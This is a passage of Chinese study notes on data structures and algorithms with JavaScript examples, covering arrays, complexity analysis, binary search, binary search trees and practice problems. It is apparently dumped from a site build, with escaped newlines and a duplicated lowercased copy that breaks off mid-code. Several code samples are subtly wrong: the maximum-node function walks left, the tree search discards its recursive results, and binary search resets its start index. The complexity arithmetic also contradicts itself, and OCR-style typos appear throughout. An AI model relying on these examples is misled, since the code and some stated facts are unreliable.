任意位置添加或删除元素\n\n> arr.splice(位置，删除元素的个数，要追加的元素); 任意位置添加删除\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nnumbers.splice(5,3);\n\n\n\n# 栈\n\n\n# 算法\n\n算法是规则的有限集合，是为解决特定问题而规定的一系列操作\n\n\n# 算法的特性\n\n 1. 有限性：有限步骤之内正常结束，不能形成无穷循环\n 2. 确定性：算法中的每一个步骤必须有明确的含义，无二义性\n 3. 可行性：原则上能精确进行，操作可通过已实现的基本运算执行有限次而完成\n 4. 输入：有多个或者0个输出\n 5. 输出：有至少一个输出\n\n\n# 算法的设计要求\n\n正确性、可读性、健壮性(鲁棒性)、高效率和低储存量\n\n\n# 算法的复杂度\n\n算法的时间复杂度和空间复杂度合称为算法的复杂度。\n一个算法的优劣主要从算法的执行时间和所需要占用的存储空间两个方面衡量。\n\n\n# 时间复杂度\n\n时间频度 一个算法执行所耗费的时间，从理论上是不能算出来的，必须上机运行测试才能知道。但我们不可能也没有必要对每个算法都上机测试，只需知道哪个算法花费的时间多，哪个算法花费的时间少就可以了。并且一个算法花费的时间与算法中语句的执行次数成正比例，哪个算法中语句执行次数多，它花费时间就多。一个算法中的语句执行次数称为语句频度或时间频度。记为T(n)。\n\n常见的算法时间复杂度以及他们在效率上的高低顺序记录：\nO(1) 常数阶 < O(logn) 对数阶 < O(n) 线性阶 < O(nlogn) < O(n^2) 平方阶 < O(n^3) < { O(2^n) < O(n!) < O(n^n) }\n\n设计的算法推导出的“大O阶”是大括号中的这几位，就需要重新研究新的算法出来，因为大括号中的这几位即便是在 n 的规模比较小的情况下仍然要耗费大量的时间，算法的时间复杂度大的离谱，基本上就是“不可用状态”。\n\n大O推导法：\n\n 1. 用常数1取代运行时间中的所有加法常数。\n 2. 在修改后的运行次数函数中，只保留最髙阶项。\n 3. 如果最高阶项存在且不是1,则去除与这个项相乘的常数。\n\nvar i=j=x=0, sum = 0, n = 100;      //执行1次\nfor( i = 1; i <= n; i++){\n    sum = sum + i;\n    for( j = 1; j <= n; j++){       \n        x++;                // 执行n*n次\n        sum = sum + x;\n    }\n}\nconsole.log(\'时间复杂度\');            //执行1次\n\n//执行总次数 = 1 + (n + 1) + n*(n + 1) + n*n + (n + 1) + 1 = 2n2 + 3n + 3\n/*\n通过大O推导法得出：\n1. 执行总次数 = 2n^2 + 3n + 1\n2. 执行总次数 = 2n^2\n3. 执行总次数 = n^2\n*/\n//算法时间复杂度表示为： O( n^2 )\n\n\nfunction fun(n){\n  for (int i = 0; i < n; i++) {                   //执行n次\n        for (int j = i; j < n; j++) {            //执行次数逐渐递减 (n - 1) + (n - 2)……\n            printf("Hello World\\n");\n        }\n    }\n}\n//执行次数= n + (n - 1) + (n - 2)……+ 1 = n(n + 1) / 2 = n^2 / 2 + n / 2\n/*\n通过大O推导法得出：\n1. 执行总次数 = n^2 / 2 + n / 2\n2. 执行总次数 = n^2 / 2\n3. 执行总次数 = n^2\n*/\n//算法时间复杂度表示为： O( n^2 )\n\n\n算法的时间复杂度和两个因素有关：算法中的最大嵌套循环层数；最内层循环结构中循环的次数。\n\n\n# 空间复杂度\n\n在写代码时，完全可以用空间来换去时间。\n\n一个程序的空间复杂度是指运行完一个程序所需内存的大小。算法的空间复杂度通过计算算法所需的存储空间实现，算法空间复杂度的计算公式记作:S(n)= O(f(n))，其中，n为问题的规模，f(n)为语句关于n所占存储空间的函数。\n\n算法执行时所需的存储空间包括以下两部分:\n\n 1. 固定部分。这部分空间的大小与输入/输出的数据的个数、数值无关。主要包括指令空间（即代码空间）、数据空间（常量、简单变量）等所占的空间。这部分属于静态空间。\n 2. 可变空间，这部分空间的主要包括动态分配的空间，以及递归栈所需的空间等。这部分的空间大小与算法有关。\n\n空间复杂度计算方法:\n\n * 忽略常数，用O(1)表示\n * 递归算法的空间复杂度=递归深度N*每次递归所要的辅助空间\n * 对于单线程来说，递归有运行时堆栈，求的是递归最深的那一次压栈所耗费的空间的个数，因为递归最深的那一次所耗费的空间足以容纳它所有递归过程。\n\n当一个算法的空间复杂度为一个常量，即不随被处理数据量n的大小而改变时，可表示为O(1)；当一个算法的空间复杂度与以2为底的n的对数成正比时，可表示为0(10g2n)；当一个算法的空I司复杂度与n成线性比例关系时，可表示为0(n).若形参为数组，则只需要为它分配一个存储由实参传送来的一个地址指针的空间，即一个机器字长空间；若形参为引用方式，则也只需要为其分配存储一个地址的空间，用它来存储对应实参变量的地址，以便由系统自动引用实参变量。\n\nvar a=1;\nvar b=2;\nconsole.log(a,b);\n//空间复杂度O（n）=O（1）；\n\n\nfunction fun(n){\n  k = 10\n  if n == k{\n    return n\n  }else{\n    return fun(++n)\n  }  \n}\n//调用fun函数，每次都创建1个变量k。调用n次，空间复杂度O（n*1）=O（n)。\n\n\nfor(var i=0;i<n;i++){\n  var temp = i;\n}\n//变量的内存分配发生在定义的时候，因为temp的定义是循环里边，所以是n*O(1)\n\n\ntemp=0;\nfor(i=0;i<n;i++){\n  temp = i\n}\n//temp定义在循环外边，所以是1*O(1)\n\n\n\n# 算法性能选择\n\n要节约算法的执行时间往往要以牺牲更多的空间为代价，而为了节省空间可能要消耗更多的计算时间\n\n 1. 若程序使用次数较少，则力求算法简明易懂\n 2. 对于反复使用的程序，应尽可能选择快速的算法\n 3. 若待解决的问题数据量极大，计算机的存储空间较小，则相应算法主要考虑如何节省空间\n\n\n# 排序算法\n\n * 十大排序算法总结\n   https://www.cnblogs.com/jztan/p/5878630.html\n * 用HTML5实现的各种排序算法的动画比较\n   http://www.webhek.com/post/comparison-sort.html\n\n\n# 查找算法\n\n线性查找效率最慢，可对无序列表进行查找、\n二分查找效率最快，只能针对有序列表进行查找\n\n\n# 基于线性表的查找法\n\n * 二分查找(折半查找)\n   二分查找也称折半查找（Binary Search），它是一种效率较高的查找方法。但是，折半查找要求线性表必须采用顺序存储结构，而且表中元素按关键字有序排列。\n\nfunction binarySearch(data, dest, start, end){\n    var end = end || data.length - 1,\n        start = start || 0,\n        m = Math.floor((start + end) / 2);\n    if(data[m] == dest){\n        return m;\n    }\n    if(dest < data[m]){\n        return binarySearch(data, dest, 0, m-1);\n    }else{\n        return binarySearch(data, dest, m+1, end);\n    }\n\n    return false;\n}\nvar arr = [-34, 1, 3, 4, 5, 8, 34, 45, 65, 87];\nbinarySearch(arr,4);          //3\n\n\n# 分块查找法(索引顺序查找)\n\n分块查找是折半查找和顺序查找的一种改进方法，分块查找由于只要求索引表是有序的，对块内节点没有排序要求，因此特别适合于节点动态变化的情况。\n\n\n# 基于树的查找法\n\n# 二叉排序树(二叉查找树、二叉搜索树)\n\n二叉排序树或者是一棵空树，或者是具有下列性质的二叉树：\n\n 1. 若左子树不空，则左子树上所有结点的值均小于它的根结点的值；\n 2. 若右子树不空，则右子树上所有结点的值均大于它的根结点的值；\n 3. 左、右子树也分别为二叉排序树；\n 4. 没有键值相等的节点。\n\n# 创建二叉搜索树\n\nfunction BinaryTree(){\n    var Node=function(key){         //节点函数\n        this.key=key;\n        this.left=null;\n        this.right=null;\n    }\n    var root=null;                  //根元素\n    this.insert=function(key){      //对外提供访问函数内部的接口\n        var newNode=new Node(key);\n        if(root==null){\n            root=newNode\n        }else{\n            insertNode(root,newNode);\n        }\n    }\n    var insertNode=function(node,newNode){//创建相互关系的根实体\n        if(node.key>newNode.key){\n            if(node.left==null){\n                node.left=newNode;\n            }else{\n                insertNode(node.left,newNode)\n            }\n        }else{\n            if(node.right==null){\n                node.right=newNode\n            }else{\n                insertNode(node.right,newNode)\n            }\n        }\n    }\n}\n\n\n> 二叉树是每个结点最多有两个子树的有序树。\n\n# 二叉树的排序\n\n 1. 中序遍历\n\n> 先左后根最后右\n\nvar inOrderTraverseNode=function(node,callback){\n    if(node!=null){\n        inOrderTraverseNode(node.left,callback)\n        callback(node.key)\n        inOrderTraverseNode(node.right,callback)\n    }\n}\n\nthis.inOrderTraverse=function(callback){\n    inOrderTraverseNode(root,callback);\n}\n\n\n 2. 前序遍历 可以很有效率的复制一个二叉树对象\n\n> 根节点排最先，然后同级先左后右\n\nvar proOrderTraverseNode=function(node,callback){\n    if(node!=null){\n        callback(node.key)\n        proOrderTraverseNode(node.left,callback)\n        proOrderTraverseNode(node.right,callback)\n    }\n}\n//前序遍历  复制   效率高得多\nthis.proOrderTraverse=function(callback){\n    proOrderTraverseNode(root,callback);\n}\n\n\n 3. 后序遍历 选查找子集的特性可以运用在文件系统遍历当中\n\n> 先左后右最后根\n\nvar postOrderTraverseNode=function(node,callback){\n    if(node!=null){\n        postOrderTraverseNode(node.left,callback)\n        postOrderTraverseNode(node.right,callback)\n        callback(node.key)\n    }\n}\n//后续遍历  文件系统遍历\nthis.postOrderTraverse=function(callback){\n    postOrderTraverseNode(root,callback);\n}\n\n\n 4. 测试：\n\n// 前序遍历\nvar nodes=[8,3,10,1,6,14,4,7,13];\nvar binaryTree=new BinaryTree();\nnodes.forEach(function(key){\n    binaryTree.insert(key);\n})\nvar callback=function(key){\n    console.log(key)\n}\nbinaryTree.inOrderTraverse(callback)\n\n\n# 查找\n\n 1. 查找指定值\n\nvar searchNode=function(node,key){\n    if(node==null){\n        return false\n    }\n    if(node.key>key){  //小于当前node往左找\n        searchNode(node.left,key)\n    }else if(node.key<key){ //大于当前node往右找\n        searchNode(node.right,key)\n    }else{ // 找到\n        return true;\n    }\n}\nthis.search=function(key){\n    return searchNode(root,key)\n}\n\n\n 2. 查找最值\n\n// 最大值\nvar maxNode=function(node){\n    if(node){\n        while(node&&node.right!=null){\n            node=node.left\n        }\n        return node.key;\n    }\n}\nthis.max=function(){\n    return maxNode(root)\n}\n// 最小值\nvar minNode=function(node){\n    if(node){\n        while(node&&node.left!=null){\n            node=node.left\n        }\n\n        return node.key;\n    }\n}\nthis.min=function(){\n    return minNode(root)\n}\n\n\n\n# 计算式查找法————哈希法\n\n根据关键字（key)而直接访问在内存储存位置\n\n\n# 简单算法题\n\n * 给定一个包含非负整数的mxn网格，请找出一条从左上角到右下角的路径，使得路径上的数字总和为最小。\n   说明：每次只能向下或者向右移动一步。\n   输入: [ [1,3,1], [1,5,1], [4,2,1] ] 输出: 7 解释: 因为路径 1→3→1→1→1 的总和最小。\n\nvar minPathSum = function(grid) {  \n    var n = grid.length\n    if(n == 0) return 0\n    for(let i = 0; i < n; i++){\n        for(let j = 0; j < grid[i].length; j++){              \n            if(!i && !j) continue\n            grid[i][j] = Math.min((i ? grid[i - 1][j] : Number.MAX_VALUE),(j ? grid[i][j - 1] : Number.MAX_VALUE)) + grid[i][j]\n        }\n    }\n    return grid[n - 1][grid[0].length - 1]\n};\n\n\n * 给定一个由整数组成的非空数组所表示的非负整数，在该数的基础上加一。\n   最高位数字存放在数组的首位， 数组中每个元素只存储一个数字。\n   你可以假设除了整数 0 之外，这个整数不会以零开头。\n * 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。 每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 注意：给定 n 是一个正整数。\n\n示例 1：\n\n输入： 2\n输出： 2\n解释： 有两种方法可以爬到楼顶。\n1.  1 阶 + 1 阶\n2.  2 阶\n示例 2：\n\n输入： 3\n输出： 3\n解释： 有三种方法可以爬到楼顶。\n1.  1 阶 + 1 阶 + 1 阶\n2.  1 阶 + 2 阶\n3.  2 阶 + 1 阶\n\n\n * 给定一个 m x n 的矩阵，如果一个元素为 0，则将其所在行和列的所有元素都设为 0。\n\n输入:\n[\n  [1,1,1],\n  [1,0,1],\n  [1,1,1]\n]\n输出:\n[\n  [1,0,1],\n  [0,0,0],\n  [1,0,1]\n]\n\n\nvar setZeroes = function(matrix) {\n    const cached = [];\n    const a = matrix.length;\n    const b = matrix[0].length;\n\n    for (const i of matrix.keys()) {\n        for (const j of matrix[i].keys()) {\n            if(matrix[i][j] === 0) {\n                cached.push(\n                        ...Array(b).fill().map((_, k) => [i, k]),\n                        ...Array(a).fill().map((_, k) => [k, j]),\n                );\n            }\n        }\n    }\n\n    for (const [x, y] of cached) {\n        matrix[x][y] = 0;\n    }\n\n    return matrix;\n};\n\n\n * 给定两个整数 n 和 k，返回 1 ... n 中所有可能的 k 个数的组合。\n\n输入: n = 4, k = 2\n输出:\n[\n  [2,4],\n  [3,4],\n  [2,3],\n  [1,2],\n  [1,3],\n  [1,4],\n]\n\n\nvar combine = function(n, k) {\n    const arr = Array(n).fill().map((_,index) => index + 1);\n    const buffer = [];\n    const result = [];\n\n    const backTrace = (index, target) => {\n        if(target == 0) {\n            return result.push(buffer.slice());\n        }\n\n        if(index === arr.length) return;\n\n        buffer.push(arr[index]);\n        backTrace(index + 1, target - 1);\n        buffer.pop();\n\n        backTrace(index + 1, target);\n    }\n    backTrace(0, k);\n\n    return result;\n};\n\n\n * 给定一个包括 n 个整数的数组 nums 和 一个目标值 target。找出 nums 中的三个整数，使得它们的和与 target 最接近。返回这三个数的和。假定每组输入只存在唯一答案。\n\n例如，给定数组 nums = [-1，2，1，-4], 和 target = 1.\n与 target 最接近的三个数的和为 2. (-1 + 2 + 1 = 2).\n\n\nvar threeSumClosest = function(nums, target) {\n    nums.sort(function(a, b) {\n        return a - b\n    })\n    let res = nums[0] + nums[1] + nums[2]\n    let cur = 0\n    let diff = Math.abs(nums[0] + nums[1] + nums[2] -target)\n    for(let i=0;i<nums.length - 2; i++) {\n        let j = i + 1\n        let k = nums.length - 1\n        while(j<k) {\n\t    cur = nums[i] + nums[j] + nums[k]\n            if(Math.abs(cur - target) < diff) {\n                diff = Math.abs(cur - target)\n                res = cur\n            }\n            if(cur < target) {\n                j++\n            } else {\n                k--\n            }\n        }\n    }\n    return res\n};\n\n\n * 给定一个仅包含 0 和 1 的二维二进制矩阵，找出只包含 1 的最大矩形，并返回其面积。\n\n输入:\n[\n  ["1","0","1","0","0"],\n  ["1","0","1","1","1"],\n  ["1","1","1","1","1"],\n  ["1","0","0","1","0"]\n]\n输出: 6\n\n\n * 小偷又发现了一个新的可行窃的地区。这个地区只有一个入口，我们称之为“根”。 除了“根”之外，每栋房子有且只有一个“父“房子与之相连。一番侦察之后，聪明的小偷意识到“这个地方的所有房屋的排列类似于一棵二叉树”。 如果两个直接相连的房子在同一天晚上被打劫，房屋将自动报警。\n   计算在不触动警报的情况下，小偷一晚能够盗取的最高金额。\n\n输入: [3,4,5,1,3,null,1]\n     3\n    / \\\n   4   5\n  / \\   \\\n 1   3   1\n输出: 9\n解释: 小偷一晚能够盗取的最高金额 = 4 + 5 = 9.\n输入: [3,2,3,null,3,null,1]\n     3\n    / \\\n   2   3\n    \\   \\\n     3   1\n输出: 7\n解释: 小偷一晚能够盗取的最高金额 = 3 + 3 + 1 = 7.\n\n\n * 给定一个赎金信 (ransom) 字符串和一个杂志(magazine)字符串，判断第一个字符串ransom能不能由第二个字符串magazines里面的字符构成。如果可以构成，返回 true ；否则返回 false。\n   (题目说明：为了不暴露赎金信字迹，要从杂志上搜索各个需要的字母，组成单词来表达意思。)\n\n你可以假设两个字符串均只含有小写字母。\ncanConstruct("a", "b") -> false\ncanConstruct("aa", "ab") -> false\ncanConstruct("aa", "aab") -> true\n\n\n * 使用栈实现队列的下列操作：\n   push(x) -- 将一个元素放入队列的尾部。\n   pop() -- 从队列首部移除元素。\n   peek() -- 返回队列首部的元素。\n   empty() -- 返回队列是否为空。\n\nMyQueue queue = new MyQueue();\n\nqueue.push(1);\nqueue.push(2);  \nqueue.peek();  // 返回 1\nqueue.pop();   // 返回 1\nqueue.empty(); // 返回 false\n\n\n/**\n * Initialize your data structure here.\n */\nvar MyQueue = function() {\n    this.input = []\n    this.output = []\n    this.size = 0\n};\n\n/**\n * Push element x to the back of queue.\n * @param {number} x\n * @return {void}\n */\nMyQueue.prototype.push = function(x) {\n    this.input.push(x)\n    this.size += 1\n};\n\n/**\n * Removes the element from in front of queue and returns that element.\n * @return {number}\n */\nMyQueue.prototype.pop = function() {\n    if(this.output.length === 0) {\n      for(var i = 0; i < this.size; i++) {\n        this.output[this.size-i-1] = this.input[i]\n      }   \n      this.size = 0\n      this.input = []\n    }\n    return this.output.pop()\n};\n\n/**\n * Get the front element.\n * @return {number}\n */\nMyQueue.prototype.peek = function() {\n    if(this.output.length === 0) {\n      for(var i = 0; i < this.size; i++) {\n        this.output[this.size-i-1] = this.input[i]\n      }   \n      this.size = 0\n      this.input = []\n    }\n    return this.output[this.output.length - 1]\n};\n\n/**\n * Returns whether the queue is empty.\n * @return {boolean}\n */\nMyQueue.prototype.empty = function() {\n    return (this.output.length===0&&this.size===0)\n};\n\n/**\n * Your MyQueue object will be instantiated and called as such:\n * var obj = Object.create(MyQueue).createNew()\n * obj.push(x)\n * var param_2 = obj.pop()\n * var param_3 = obj.peek()\n * var param_4 = obj.empty()\n */\n\n\n * 给定一个非负索引 k，其中 k ≤ 33，返回杨辉三角的第 k 行。\n   在杨辉三角中，每个数是它左上方和右上方的数的和。\n\n输入: 3\n输出: [1,3,3,1]\n\n\nvar getRow = function(numRows) {\n    if (numRows === 0) return [1];\n\n    const result = [[1]];\n\n    for (let index = 1; index < numRows + 1; index++) {\n        const last = result[result.length - 1];\n        result.push(Array(index + 1).fill(1).map((_, ind) => (last[ind] || 0) + (last[ind - 1] || 0)))\n    }\n\n    return result[numRows];\n};\n\n\n * 优势洗牌 (田忌赛马) 给定两个大小相等的数组 A 和 B，A 相对于 B 的优势可以用满足 A[i] > B[i]的索引i的数目来描述。\n   返回 A 的任意排列，使其相对于 B 的优势最大化。\n\n输入：A = [2,7,11,15], B = [1,10,4,11]\n输出：[2,11,7,15]  \n\n输入：A = [12,24,8,32], B = [13,25,32,11]\n输出：[24,32,8,12]\n\n\nvar advantageCount = function(A, B) {\n    var arr = [];\n    A.sort(function(a, b) {\n        return a - b;\n              });\n    B.forEach(function(item) {\n        var index = A.findIndex(function(_item) {\n            return _item > item;\n        });\n    if (index > -1) {\n        arr.push(A.splice(index, 1)[0]);\n        } else  {\n            arr.push(A.splice(0, 1)[0]);\n        } });\n    return arr;\n};\n\n\n * 给定两个二叉树，编写一个函数来检验它们是否相同。 如果两个树在结构上相同，并且节点具有相同的值，则认为它们是相同的。\n\n输入:       1         1\n          / \\       / \\\n         2   3     2   3\n\n        [1,2,3],   [1,2,3]\n\n输出: true\n\n输入:      1          1\n          /           \\\n         2             2\n\n        [1,2],     [1,null,2]\n\n输出: false\n\n输入:       1         1\n          / \\       / \\\n         2   1     1   2\n\n        [1,2,1],   [1,1,2]\n\n输出: false\n\n\nvar isSameTree = function(p, q) {\n    const queue = [[p, q]];\n    while(queue.length) {\n        const [cp, cq] = queue.shift();\n        if(!cp && !cq) continue;\n        if(!cp && cq || cp && !cq) {\n            return false;\n        }\n        if(cp.val !== cq.val) {\n            return false;\n        }\n        queue.push([cp.left, cq.left], [cp.right, cq.right])\n    }\n    return true;\n};\n\n\n * 给定一个二叉树，判断其是否是一个有效的二叉搜索树。\n   假设一个二叉搜索树具有如下特征：\n   节点的左子树只包含小于当前节点的数。\n   节点的右子树只包含大于当前节点的数。\n   所有左子树和右子树自身必须也是二叉搜索树。\n\n输入:\n    2\n   / \\\n  1   3\n输出: true\n\n输入:\n    5\n   / \\\n  1   4\n     / \\\n    3   6\n输出: false\n解释: 输入为: [5,1,4,null,null,3,6]。\n     根节点的值为 5 ，但是其右子节点值为 4 。\n\n\nvar inorderTraversal = function(root) {\n    const result = [];\n    const inorder = node => {\n        if(!node) return;\n        inorder(node.left);\n        result.push(node.val);\n        inorder(node.right);\n    }\n    inorder(root);\n    return result;\n};\n\nvar isValidBST = function(root) {\n    const arr = inorderTraversal(root);\n    return arr.every((item, index) => item > (index > 0 ? arr[index - 1] : -Infinity));\n};\n\n\n * 给定一个整数 n，求以 1 ... n 为节点组成的二叉搜索树有多少种？\n\n输入: 3\n输出: 5\n解释:\n给定 n = 3, 一共有 5 种不同结构的二叉搜索树:\n\n   1         3     3      2      1\n    \\       /     /      / \\      \\\n     3     2     1      1   3      2\n    /     /       \\                 \\\n   2     1         2                 3\n',normalizedContent:'算法+数据结构=程序\n数据结构是底层，算法高层。数据结构为算法提供服务。算法围绕数据结构操作\n\n\n# 数据结构\n\n\n# 常见的数据结构\n\n * 数组（aarray）\n * 栈（stack）\n * 链表（linked list）\n * 图（graph）\n * 散列表（hash）\n * 队列（queue）\n * 树（tree）\n * 堆（heap）\n\n\n# 数组\n\n> 几乎所有的编程语言都原生支持数组类型，因为数组是最简单的内存数据结构。javascript里也有数组类型，尽管它的第一个版本并没有支持数组。\n\n\n# 创建和初始化\n\nlet daysofweek = new array(); \ndaysofweek = new array(7); \ndaysofweek = new array(\'sunday\', \'monday\', \'tuesday\', \'wednesday\', \n\'thursday\', \'friday\', \'saturday\'); \n\nconsole.log(daysofweek.length); //7\n\n\n\n# 访问元素和迭代数组\n\n> 要访问数组里特定位置的元素，可以用中括号[]传递数值位置，得到想知道的值或者赋新的值。\n\n\nfor (let i = 0; i < daysofweek.length; i++) { \n console.log(daysofweek[i]); \n}\n\n\n\n# 添加元素\n\n添加到尾部\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nnumbers[numbers.length] = 10\n// or\nnumbers.push(1,2,3)\n\n\n添加到开头\n\n> 要腾出数组里第一个元素的位置，把所有的元素向右移动一位。我们可以循环数组中的元素，从最后一位（长度值就是数组的末尾位置）开始，将对应的前 一个元素（i-1）的值赋给它（i），依次处理，最后把我们想要的值赋给第一个位置（索引 0）上。\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\narray.prototype.insertfirstposition = function(value) { \n for (let i = this.length; i >= 0; i--) { \n this[i] = this[i - 1]; \n } \n this[0] = value; \n}; \nnumbers.insertfirstposition(-1);\nor\nnumbers.unshift(-4, -3); //（此方法背后的逻辑和 insertfirstposition 方法的行为是一样的\n\n\n\n\n\n# 删除元素\n\n末尾删除元素\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nnumbers.pop();\n\n\n开头删除元素\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nfor (let i = 0; i < numbers.length; i++) { \n numbers[i] = numbers[i + 1]; \n}\nor\nnumbers.shift();\n\n\n\n\n\n\n# 任意位置添加或删除元素\n\n> arr.splice(位置，删除元素的个数，要追加的元素); 任意位置添加删除\n\nconst  numbers = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]\nnumbers.splice(5,3);\n\n\n\n# 栈\n\n\n# 算法\n\n算法是规则的有限集合，是为解决特定问题而规定的一系列操作\n\n\n# 算法的特性\n\n 1. 有限性：有限步骤之内正常结束，不能形成无穷循环\n 2. 确定性：算法中的每一个步骤必须有明确的含义，无二义性\n 3. 可行性：原则上能精确进行，操作可通过已实现的基本运算执行有限次而完成\n 4. 输入：有多个或者0个输出\n 5. 输出：有至少一个输出\n\n\n# 算法的设计要求\n\n正确性、可读性、健壮性(鲁棒性)、高效率和低储存量\n\n\n# 算法的复杂度\n\n算法的时间复杂度和空间复杂度合称为算法的复杂度。\n一个算法的优劣主要从算法的执行时间和所需要占用的存储空间两个方面衡量。\n\n\n# 时间复杂度\n\n时间频度 一个算法执行所耗费的时间，从理论上是不能算出来的，必须上机运行测试才能知道。但我们不可能也没有必要对每个算法都上机测试，只需知道哪个算法花费的时间多，哪个算法花费的时间少就可以了。并且一个算法花费的时间与算法中语句的执行次数成正比例，哪个算法中语句执行次数多，它花费时间就多。一个算法中的语句执行次数称为语句频度或时间频度。记为t(n)。\n\n常见的算法时间复杂度以及他们在效率上的高低顺序记录：\no(1) 常数阶 < o(logn) 对数阶 < o(n) 线性阶 < o(nlogn) < o(n^2) 平方阶 < o(n^3) < { o(2^n) < o(n!) < o(n^n) }\n\n设计的算法推导出的“大o阶”是大括号中的这几位，就需要重新研究新的算法出来，因为大括号中的这几位即便是在 n 的规模比较小的情况下仍然要耗费大量的时间，算法的时间复杂度大的离谱，基本上就是“不可用状态”。\n\n大o推导法：\n\n 1. 用常数1取代运行时间中的所有加法常数。\n 2. 在修改后的运行次数函数中，只保留最髙阶项。\n 3. 如果最高阶项存在且不是1,则去除与这个项相乘的常数。\n\nvar i=j=x=0, sum = 0, n = 100;      //执行1次\nfor( i = 1; i <= n; i++){\n    sum = sum + i;\n    for( j = 1; j <= n; j++){       \n        x++;                // 执行n*n次\n        sum = sum + x;\n    }\n}\nconsole.log(\'时间复杂度\');            //执行1次\n\n//执行总次数 = 1 + (n + 1) + n*(n + 1) + n*n + (n + 1) + 1 = 2n2 + 3n + 3\n/*\n通过大o推导法得出：\n1. 执行总次数 = 2n^2 + 3n + 1\n2. 执行总次数 = 2n^2\n3. 执行总次数 = n^2\n*/\n//算法时间复杂度表示为： o( n^2 )\n\n\nfunction fun(n){\n  for (int i = 0; i < n; i++) {                   //执行n次\n        for (int j = i; j < n; j++) {            //执行次数逐渐递减 (n - 1) + (n - 2)……\n            printf("hello world\\n");\n        }\n    }\n}\n//执行次数= n + (n - 1) + (n - 2)……+ 1 = n(n + 1) / 2 = n^2 / 2 + n / 2\n/*\n通过大o推导法得出：\n1. 执行总次数 = n^2 / 2 + n / 2\n2. 执行总次数 = n^2 / 2\n3. 执行总次数 = n^2\n*/\n//算法时间复杂度表示为： o( n^2 )\n\n\n算法的时间复杂度和两个因素有关：算法中的最大嵌套循环层数；最内层循环结构中循环的次数。\n\n\n# 空间复杂度\n\n在写代码时，完全可以用空间来换去时间。\n\n一个程序的空间复杂度是指运行完一个程序所需内存的大小。算法的空间复杂度通过计算算法所需的存储空间实现，算法空间复杂度的计算公式记作:s(n)= o(f(n))，其中，n为问题的规模，f(n)为语句关于n所占存储空间的函数。\n\n算法执行时所需的存储空间包括以下两部分:\n\n 1. 固定部分。这部分空间的大小与输入/输出的数据的个数、数值无关。主要包括指令空间（即代码空间）、数据空间（常量、简单变量）等所占的空间。这部分属于静态空间。\n 2. 可变空间，这部分空间的主要包括动态分配的空间，以及递归栈所需的空间等。这部分的空间大小与算法有关。\n\n空间复杂度计算方法:\n\n * 忽略常数，用o(1)表示\n * 递归算法的空间复杂度=递归深度n*每次递归所要的辅助空间\n * 对于单线程来说，递归有运行时堆栈，求的是递归最深的那一次压栈所耗费的空间的个数，因为递归最深的那一次所耗费的空间足以容纳它所有递归过程。\n\n当一个算法的空间复杂度为一个常量，即不随被处理数据量n的大小而改变时，可表示为o(1)；当一个算法的空间复杂度与以2为底的n的对数成正比时，可表示为0(10g2n)；当一个算法的空i司复杂度与n成线性比例关系时，可表示为0(n).若形参为数组，则只需要为它分配一个存储由实参传送来的一个地址指针的空间，即一个机器字长空间；若形参为引用方式，则也只需要为其分配存储一个地址的空间，用它来存储对应实参变量的地址，以便由系统自动引用实参变量。\n\nvar a=1;\nvar b=2;\nconsole.log(a,b);\n//空间复杂度o（n）=o（1）；\n\n\nfunction fun(n){\n  k = 10\n  if n == k{\n    return n\n  }else{\n    return fun(++n)\n  }  \n}\n//调用fun函数，每次都创建1个变量k。调用n次，空间复杂度o（n*1）=o（n)。\n\n\nfor(var i=0;i<n;i++){\n  var temp = i;\n}\n//变量的内存分配发生在定义的时候，因为temp的定义是循环里边，所以是n*o(1)\n\n\ntemp=0;\nfor(i=0;i<n;i++){\n  temp = i\n}\n//temp定义在循环外边，所以是1*o(1)\n\n\n\n# 算法性能选择\n\n要节约算法的执行时间往往要以牺牲更多的空间为代价，而为了节省空间可能要消耗更多的计算时间\n\n 1. 若程序使用次数较少，则力求算法简明易懂\n 2. 对于反复使用的程序，应尽可能选择快速的算法\n 3. 若待解决的问题数据量极大，计算机的存储空间较小，则相应算法主要考虑如何节省空间\n\n\n# 排序算法\n\n * 十大排序算法总结\n   https://www.cnblogs.com/jztan/p/5878630.html\n * 用html5实现的各种排序算法的动画比较\n   http://www.webhek.com/post/comparison-sort.html\n\n\n# 查找算法\n\n线性查找效率最慢，可对无序列表进行查找、\n二分查找效率最快，只能针对有序列表进行查找\n\n\n# 基于线性表的查找法\n\n * 二分查找(折半查找)\n   二分查找也称折半查找（binary search），它是一种效率较高的查找方法。但是，折半查找要求线性表必须采用顺序存储结构，而且表中元素按关键字有序排列。\n\nfunction binarysearch(data, dest, start, end){\n    var end = end || data.length - 1,\n        start = start || 0,\n        m = math.floor((start + end) / 2);\n    if(data[m] == dest){\n        return m;\n    }\n    if(dest < data[m]){\n        return binarysearch(data, dest, 0, m-1);\n    }else{\n        return binarysearch(data, dest, m+1, end);\n    }\n\n    return false;\n}\nvar arr = [-34, 1, 3, 4, 5, 8, 34, 45, 65, 87];\nbinarysearch(arr,4);          //3\n\n\n# 分块查找法(索引顺序查找)\n\n分块查找是折半查找和顺序查找的一种改进方法，分块查找由于只要求索引表是有序的，对块内节点没有排序要求，因此特别适合于节点动态变化的情况。\n\n\n# 基于树的查找法\n\n# 二叉排序树(二叉查找树、二叉搜索树)\n\n二叉排序树或者是一棵空树，或者是具有下列性质的二叉树：\n\n 1. 若左子树不空，则左子树上所有结点的值均小于它的根结点的值；\n 2. 若右子树不空，则右子树上所有结点的值均大于它的根结点的值；\n 3. 左、右子树也分别为二叉排序树；\n 4. 没有键值相等的节点。\n\n# 创建二叉搜索树\n\nfunction binarytree(){\n    var node=function(key){         //节点函数\n        this.key=key;\n        this.left=null;\n        this.right=null;\n    }\n    var root=null;                  //根元素\n    this.insert=function(key){      //对外提供访问函数内部的接口\n        var newnode=new node(key);\n        if(root==null){\n            root=newnode\n        }else{\n            insertnode(root,newnode);\n        }\n    }\n    var insertnode=function(node,newnode){//创建相互关系的根实体\n        if(node.key>newnode.key){\n            if(node.left==null){\n                node.left=newnode;\n            }else{\n                insertnode(node.left,newnode)\n            }\n        }else{\n            if(node.right==null){\n                node.right=newnode\n            }else{\n                